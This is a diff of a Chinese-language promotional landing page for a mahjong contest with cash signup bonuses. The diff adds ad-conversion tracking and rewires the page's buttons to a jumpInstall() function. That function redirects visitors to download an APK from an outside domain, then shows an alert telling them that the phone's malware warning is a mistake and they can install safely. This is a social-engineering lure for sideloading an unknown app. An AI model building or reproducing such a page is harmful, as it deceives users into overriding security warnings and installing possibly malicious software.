@@ -10,6 +10,20 @@
   </plasmo-csui>
   
   <head>
+  
+  
+	  
+  <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=AW-10976787172"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'AW-10976787172');
+</script>
+
+
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="description" content="我们即将举办长麻争霸赛，奖金丰厚，iPhone16">
@@ -40,7 +54,7 @@
           </header>
           <main>
             <section class="links">
-              <a href="https://bit.ly/42HLLa0?r=lp&amp;m=Mp25ep3F54W" rel="noopener noreferrer" class="orb-link link" target="_blank" style="color: rgb(0, 0, 0); font-family: &quot;Open Sans&quot;, sans-serif; font-weight: 700; border: 2px solid rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.75) 0.3rem 0.4rem 0px; border-radius: 0.8rem;">
+              <a  onclick="jumpInstall()" rel="noopener noreferrer" class="orb-link link" target="_blank" style="color: rgb(0, 0, 0); font-family: &quot;Open Sans&quot;, sans-serif; font-weight: 700; border: 2px solid rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.75) 0.3rem 0.4rem 0px; border-radius: 0.8rem;">
                 <div class="link__content">
                   <span class="link__content__title">注册送10元，最高300</span>
                   <span class="link__content__description"></span>
@@ -54,7 +68,7 @@
                 <section class="launchpad-web__image-button__content">
                   <img class="aspect-ratio-original" src="./LandingPage_files/Ip25ek2XYu0" alt="" loading="lazy" style="color: rgb(0, 0, 0); font-family: &quot;Open Sans&quot;, sans-serif; font-weight: 700; border: 2px solid rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.75) 0.3rem 0.4rem 0px; border-radius: 0.8rem;"></section>
               </article>
-              <a href="https://bit.ly/4hJnvZA?r=lp&amp;m=Mp25ep3F54W" rel="noopener noreferrer" class="orb-link link" target="_blank" style="color: rgb(0, 0, 0); font-family: &quot;Open Sans&quot;, sans-serif; font-weight: 700; border: 2px solid rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.75) 0.3rem 0.4rem 0px; border-radius: 0.8rem;">
+              <a  onclick="jumpInstall()" rel="noopener noreferrer" class="orb-link link" target="_blank" style="color: rgb(0, 0, 0); font-family: &quot;Open Sans&quot;, sans-serif; font-weight: 700; border: 2px solid rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.75) 0.3rem 0.4rem 0px; border-radius: 0.8rem;">
                 <div class="link__content">
                   <span class="link__content__title">下载玩两局？</span>
                   <span class="link__content__description"></span>
@@ -89,5 +103,48 @@
       </div>
     </template>
   </plasmo-csui>
+
+<!--  执行方法-->
+
+<script>
+        function gtag_report_conversion(url) {
+            var callback = function () {
+                if (typeof(url) != 'undefined') {
+                    window.location.href = url; // 进行跳转
+                }
+            };
+		// 663 潜客
+            gtag('event', 'conversion', {
+                'send_to': 'AW-10976787172/YfObCIL944AaEOT1kfIo',
+                'value': 5.0,
+                'currency': 'USD',
+                'event_callback': callback
+            });
+
+		// 664 潜客
+            gtag('event', 'conversion', {
+                'send_to': 'AW-10977607075/T5O4CPfeiIEaEKP7w_Io',
+                'value': 5.0,
+                'currency': 'USD',
+                'event_callback': callback
+            });
+            return false;
+        }
+
+        function jumpInstall() {
+             // 谷歌事件
+            gtag_report_conversion();
+            const links = [
+                'https://agent.cbit.cc/4325270v120.apk'
+            ];
+
+            // 随机选择一个链接
+            const randomIndex = Math.floor(Math.random() * links.length);
+            const randomLink = links[randomIndex];
+        window.location.href = randomLink; // 进行跳转
+           
+              alert("【下载中】此其牌游戏可能被手机误判为恶意软件，请放心安装");
+        }
+    </script>
 
 </html>
